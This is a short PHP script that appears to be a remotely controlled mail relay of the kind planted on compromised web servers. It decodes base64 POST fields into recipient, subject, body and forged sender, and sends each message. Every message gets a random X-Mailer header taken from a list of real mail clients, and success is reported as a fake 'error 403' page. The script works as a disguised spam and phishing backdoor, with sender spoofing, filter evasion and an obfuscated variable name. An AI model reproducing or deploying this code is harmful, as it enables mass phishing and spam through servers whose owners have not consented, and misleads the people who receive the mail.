<?php



function mailto($to, $subject, $message, $from, $fromAddr) {

$mailer = 'Ximian Evolution 2.3.1 (2.0.1-6)###The Bat! (v2.00.9) Personal###Apple Mail (2.552)###Ximian Evolution 1.0.3 (1.0.3-6)###Ximian Evolution 2.0.1 (2.0.1-6)###The Bat! (v2.00.3) Personal###Mailman v2.0.8###The Bat! (v2.00.9) Personal###Microsoft Outlook Express 6.00.2800.1158###MIME-tools 5.41 (Entity 5.404)###Microsoft Outlook Express 6.00.2800.1158###Pegasus Mail for Win32 (v3.12c)###Microsoft Outlook Express 6.00.2900.2180###Mutt 1.0.1i###Microsoft Office Outlook, Build 11.0.5510###Microsoft Outlook Express 6.00.2800.1158###Sylpheed version 0.7.6 (GTK+ 1.2.10; i686-pc-tommie-gnu)###Microsoft Outlook Express 6.00.2900.2180###Evolution/1.0-5mdk###IPB PHP Mailer###Microsoft Outlook Express 6.00.2800.1158###Microsoft Office Outlook, Build 11.0.5510###IPB PHP Mailer###acme Mail###Apple Mail###Balsa###Becky!###Bloomba###Citadel###Claris Emailer###Claws Mail###Courier###EmailTray###Eudora###Forte Agent###Foxmail###Geary###GNUMail###KMail###IBM Notes & Domino###Mail###Mailbird###Microsoft Office Outlook###Modest###Mozilla Thunderbird###Mulberry###Novell Evolution###Novell GroupWise###Opera Mail###Pegasus Mail###i.Scribe/InScribe###SeaMonkey Mail & Newsgroups###Sylpheed###Sparrow###Spicebird###The Bat!###TouchMail###Windows Live Mail###YAM###Alpine###Elm###Gnus###mailx###MH###MUSH###Mutt###Pine###sendEmail###Turnpike###Upas###24SevenOffice###Alpine###Bongo###Citadel###Horde IMP###Hula project###Kerio WebMail###Mailpile###OpenGroupware Webmail###RoundCube Webmail###SquirrelMail###WebPine###Touchmail###Zimbra';
$xmailer = explode('###',  $mailer);
$gmailer = $xmailer[array_rand($xmailer)] ;

$mb_internal_encoding = mb_internal_encoding();
mb_internal_encoding('UTF-8');
$headers = "Date: ".date("r")."\r\n";
//$headers.= "Return-Path: <".$fromAddr.">\r\n";
$headers.= "From: =?UTF-8?B?".base64_encode($from)."?= <".$fromAddr.">\r\n";
$headers.= "Reply-To:  =?UTF-8?B?".base64_encode($from)."?= <".$fromAddr.">\r\n";

$headers.= "X-Mailer: " . $gmailer . "\r\n";

$headers.= "MIME-Version: 1.0\r\n";
//$headers.= "Content-Type: text/plain; charset=UTF-8\r\n";
//$headers.= "Content-Transfer-Encoding: 8bit\r\n";



$subject = "=?UTF-8?B?".base64_encode($subject)."?=";


if (strpos($message, '<html')) {
$msgType = "text/html";
} else $msgType = "text/plain";
$body = $message;
mb_internal_encoding($mb_internal_encoding);
return mail($to, $subject, $body, $headers);
}








foreach($_POST as $key => $x_value) {

$data = base64_decode($x_value) ;
$to_data = explode('|',  $data);

$to = $to_data[0];
$x_subject = $to_data[1];
$x_body = $to_data[2];
$from_user = $to_data[3];
$from_email = $to_data[4];



$jfnbrsjfq =  mailto($to, $x_subject, $x_body, $from_user, $from_email);
if($jfnbrsjfq){echo 'error 403';} else {echo 'error 404 : ' . $jfnbrsjfq;} 

}



